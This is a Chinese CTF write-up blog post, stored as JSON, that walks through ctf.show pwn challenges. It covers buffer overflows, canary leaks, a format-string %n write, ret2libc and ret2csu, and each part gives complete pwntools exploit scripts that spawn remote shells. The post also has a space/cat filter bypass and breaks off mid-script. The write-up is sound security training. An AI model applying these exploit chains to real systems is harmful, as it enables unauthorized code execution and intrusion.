{"title":"ctfshow-pwn","uid":"52662f34cef48ec0871eed4c3bef0137","slug":"ctfshow-pwn","date":"2021-10-16T09:55:50.000Z","updated":"2021-10-29T10:54:03.057Z","comments":true,"path":"api/articles/ctfshow-pwn.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/ctwdE4PqChNIpzb.jpg","content":"<h1 id=\"pwn03\"><a href=\"#pwn03\" class=\"headerlink\" title=\"pwn03\"></a>pwn03</h1><p>将附件拖进IDA中很容易发现存在栈溢出，但是没有后门函数以及system函数，也不能利用系统调用<img src=\"https://i.loli.net/2021/10/16/SdbDYyzAl3TumcV.png\" alt=\"image.png\"></p>\n<p>所以函数地址泄露获得libc版本来获得system函数地址从而获得shell。具体步骤：</p>\n<ul>\n<li>泄露 puts地址</li>\n<li>获取 libc 版本</li>\n<li>获取 system 地址与 /bin/sh 的地址</li>\n<li>再次执行源程序</li>\n<li>触发栈溢出执行 system(‘/bin/sh’)</li>\n</ul>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28015</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./stack1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]       <span class=\"comment\"># 获取puts的plt</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]           <span class=\"comment\"># 获取puts的got</span></span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]          <span class=\"comment\"># 获取程序开始地址</span></span><br><span class=\"line\">payload1 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">13</span>,puts_plt,start_addr,puts_got])         <span class=\"comment\"># 泄露puts的got地址</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\n\\n&#x27;</span>)         <span class=\"comment\"># 这里耽误了好久，因为要读取掉两个换行符，不然后面获取地址就会出错</span></span><br><span class=\"line\">libc_puts_addr = u32(p.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])          <span class=\"comment\"># 接收泄露的地址</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)        <span class=\"comment\"># 找到对应的libc</span></span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)         <span class=\"comment\"># 计算基地址</span></span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)         <span class=\"comment\"># 算出system函数的地址</span></span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">13</span>,sys_addr,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">4</span>,bin_sh])</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn04\"><a href=\"#pwn04\" class=\"headerlink\" title=\"pwn04\"></a>pwn04</h1><p>用ida打开发现存在明显的栈溢出并且还存在后门函数<img src=\"https://i.loli.net/2021/10/16/YkhGbwR5uyam1Np.png\" alt=\"屏幕截图 2021-10-16 181459.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/16/odXSjLRgc1mpGra.png\" alt=\"屏幕截图 2021-10-16 181732.png\"></p>\n<p>checksec查看发现存在canary保护，所以思路就是绕过canary保护进入后门函数从而获取shell</p>\n<p>通过IDA查看可以发现canary在ebp-c的位置，所以我们可以利用第一轮输入来泄露canary</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Hello Hacker!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">a = p.recvline()</span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>因为存在回显所以要将回显接收不然canary就会出错，已经踩坑</strong></p>\n<p><img src=\"https://i.loli.net/2021/10/16/Wof2tuehQjwRYgx.png\" alt=\"屏幕截图 2021-10-16 182347.png\"></p>\n<p>获取了canary接下来就是绕过canary进入后门函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span>,canary,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>,get_shell])</span><br><span class=\"line\">p.sendline(payload2)</span><br></pre></td></tr></table></figure>\n\n<p><strong>因为canary是四个字节，而到返回地址还需要0x70-0x64-4=8个字节，所以需要补充8个字节</strong></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><p>exp1:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28132</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./ex2&#x27;)</span></span><br><span class=\"line\">get_shell = <span class=\"number\">0x80485AF</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Hello Hacker!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">a = p.recvline()</span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span>,canary,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>,get_shell])</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>exp2：</p>\n<p>也是通过printf泄露，不过是通过计算canary到printf的偏移来泄露</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./ex&quot;)</span></span><br><span class=\"line\">p =remote(<span class=\"string\">&quot;111.231.70.44&quot;</span>,<span class=\"number\">28097</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">leak_canary = <span class=\"string\">&quot;%31$x&quot;</span></span><br><span class=\"line\">p.sendline(leak_canary)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)</span><br><span class=\"line\">print(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\">getshell = <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">100</span> + p32(canary) + <span class=\"string\">b&quot;b&quot;</span> * <span class=\"number\">12</span> + p32(<span class=\"number\">0x0804859B</span>)</span><br><span class=\"line\">p.sendline(getshell)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn07\"><a href=\"#pwn07\" class=\"headerlink\" title=\"pwn07\"></a>pwn07</h1><p>打开发现是64位程序，分析一下发现pwn03做法相同，泄露函数地址从而获取libc版本找到system函数进而获取shell。在某些细节上还是有点不同，32位是通过栈传递参数，而64位是通过寄存器传递参数(当参数小于7个时，参数从左到右放入寄存器rdi,rsi,rdx,rcx,r8,r9)，所以执行system(“bin/sh”)时rdi寄存器要存储的是bin/sh字符串，例如：</p>\n<p>泄露puts函数需要先将puts的got表地址传递到rdi寄存器中在跳转到puts函数输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure>\n\n<p>在执行system函数时不仅要记住通过rdi传参还要注意堆栈对齐：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(ret_addr)目的用于堆栈对齐，不然后面会报错。</p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28138</span>)</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04006e3</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x0004006E4</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\x0a&#x27;</span>)</span><br><span class=\"line\">libc_puts_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)</span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn10\"><a href=\"#pwn10\" class=\"headerlink\" title=\"pwn10\"></a>pwn10</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%a  浮点数、十六进制数字和p-记数法（c99</span><br><span class=\"line\">%A  浮点数、十六进制数字和p-记法（c99）</span><br><span class=\"line\">%c  一个字符(char)</span><br><span class=\"line\">%C  一个ISO宽字符</span><br><span class=\"line\">%d  有符号十进制整数(int)（%ld、%Ld：长整型数据(long),%hd：输出短整形。）　</span><br><span class=\"line\">%e  浮点数、e-记数法</span><br><span class=\"line\">%E  浮点数、E-记数法</span><br><span class=\"line\">%f  单精度浮点数(默认float)、十进制记数法（%.nf  这里n表示精确到小数位后n位.十进制计数）</span><br><span class=\"line\">%g  根据数值不同自动选择%f或%e．</span><br><span class=\"line\">%G  根据数值不同自动选择%f或%e.</span><br><span class=\"line\">%i  有符号十进制数（与%d相同）</span><br><span class=\"line\">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置</span><br><span class=\"line\">%o  无符号八进制整数</span><br><span class=\"line\">%p  指针</span><br><span class=\"line\">%s  对应字符串char*（%s &#x3D; %hs &#x3D; %hS 输出 窄字符）</span><br><span class=\"line\">%S  对应宽字符串WCAHR*（%ws &#x3D; %S 输出宽字符串）</span><br><span class=\"line\">%u  无符号十进制整数(unsigned int)</span><br><span class=\"line\">%x  使用十六进制数字0xf的无符号十六进制整数　</span><br><span class=\"line\">%X  使用十六进制数字0xf的无符号十六进制整数</span><br><span class=\"line\">%%  打印一个百分号 </span><br><span class=\"line\">%I64d 用于INT64 或者 long long</span><br><span class=\"line\">%I64u 用于UINT64 或者 unsigned long long</span><br><span class=\"line\">%I64x 用于64位16进制数据</span><br><span class=\"line\">%m.n : m指域宽，即对应的输出项在输出设备上所占的字符数。n指精度。用于说明输出的实型数的小数位数。为指定n时，隐含的精度为n&#x3D;6位。</span><br><span class=\"line\">l 对整型指long型，对实型指double型。h用于将整型的格式字符修正为short型。</span><br></pre></td></tr></table></figure>\n\n<p>打开后发现当num==16时就可以得到flag，但是没有栈溢出可以覆盖num的值。仔细观察，这里输出用的是printf函数存在格式字符串漏洞，我们可以利用%n去修改num，首先需要num的地址，其次需要一个参数指向num。通过发现我们可以看到scanf对format赋值了两次，所以我们可以先将num的地址赋给format，接下来使用%n来修改format指向num的值</p>\n<p><img src=\"https://i.loli.net/2021/10/26/hMP7uoKZlkewSvn.png\" alt=\"屏幕截图 2021-10-26 092828.png\"></p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28101</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./pwn10&quot;)</span></span><br><span class=\"line\">num_addr = <span class=\"number\">0x0804A030</span></span><br><span class=\"line\">payload = p32(num_addr)+<span class=\"string\">&quot;aaaaaaaaaaaa%7$n&quot;</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"萌新赛-签到题\"><a href=\"#萌新赛-签到题\" class=\"headerlink\" title=\"萌新赛-签到题\"></a>萌新赛-签到题</h1><p>就是简单的libc泄露。计算一下src的偏移，找到相应gadget泄露函数地址在获得libc的版本获取system函数和字符串bin/sh地址，最后组装一下就行</p>\n<p><img src=\"https://i.loli.net/2021/10/26/6IxpjB9mK4WbrRO.png\" alt=\"屏幕截图 2021-10-26 124355.png\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./pwn_check_in&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;pwn_check_in&#x27;</span>)</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">start_addr=elf.symbols[<span class=\"string\">&quot;_start&quot;</span>]</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x400793</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x40053e</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;[+] command successful!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;hhh,just a joke&#x27;</span>)</span><br><span class=\"line\">puts_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\">libcbase=puts_addr-libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x78</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;[+] command successful!\\n&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"内部赛-签到题\"><a href=\"#内部赛-签到题\" class=\"headerlink\" title=\"内部赛-签到题\"></a>内部赛-签到题</h1><p>此题与ret2csu做法相同，因为没有puts函数但是存在write函数，所以我们采取组装write函数来泄露地址，从而获取system函数以及bin/sh地址。</p>\n<p><img src=\"https://i.loli.net/2021/10/26/DlpyIGKWCtjqRVQ.png\" alt=\"屏幕截图 2021-10-26 201620.png\"></p>\n<p>gadgets和ret2csu里面的有点不一样但是大致是一样的。我们利用这两个gadgets来组装write函数，泄露我们想泄露函数的got表中地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xa8</span>+p64(gadget1)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(got_write)+p64(<span class=\"number\">8</span>)+p64(got_write)+p64(<span class=\"number\">1</span>)+p64(gadget2)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">56</span>+ p64(start)</span><br></pre></td></tr></table></figure>\n\n<p>之后利用泄露的地址计算system函数以及bin/sh地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libcbase = write_addr-libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>最后组装payload2来控制程序执行system(“bin/sh”)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0xa8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP-3\"><a href=\"#EXP-3\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./ret2libc_64&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28177</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;ret2libc_64&#x27;</span>)</span><br><span class=\"line\">got_write = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">got_write = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">start = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]  </span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04006c3</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x004004a9</span></span><br><span class=\"line\">gadget1 = <span class=\"number\">0x4006b6</span></span><br><span class=\"line\">gadget2 = <span class=\"number\">0x04006A0</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0xa8</span>+p64(gadget1)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(got_write)+p64(<span class=\"number\">8</span>)+p64(got_write)+p64(<span class=\"number\">1</span>)+p64(gadget2)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">56</span>+ p64(start)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;now,Try Pwn Me?\\n&#x27;</span>,payload1)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libcbase = write_addr-libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0xa8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;now,Try Pwn Me?\\n&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"36D杯-签到\"><a href=\"#36D杯-签到\" class=\"headerlink\" title=\"36D杯-签到\"></a>36D杯-签到</h1><p>签到题直接nc上去以后发现考察的是linux的基本操作，程序过滤掉了空格，cat，但是我们可以ls查看</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">more&lt;flag               这里&lt;可以绕过空格</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"BJDCTF2020-babyrouter\"><a href=\"#BJDCTF2020-babyrouter\" class=\"headerlink\" title=\"BJDCTF2020-babyrouter\"></a>BJDCTF2020-babyrouter</h1><p>不知道是远端有问题还是libc库不全，本地打通了但是远端没有打通，反正思路在这里</p>\n<p>很明显的一道libc泄露题目，buf的偏移是0x20</p>\n<p><img src=\"https://i.loli.net/2021/10/28/ZzYUNXD4uvWScVy.png\" alt=\"屏幕截图 2021-10-28 193359.png\"></p>\n<p>寻找gadgets</p>\n\n\n<p>构造payload1，payload2</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span 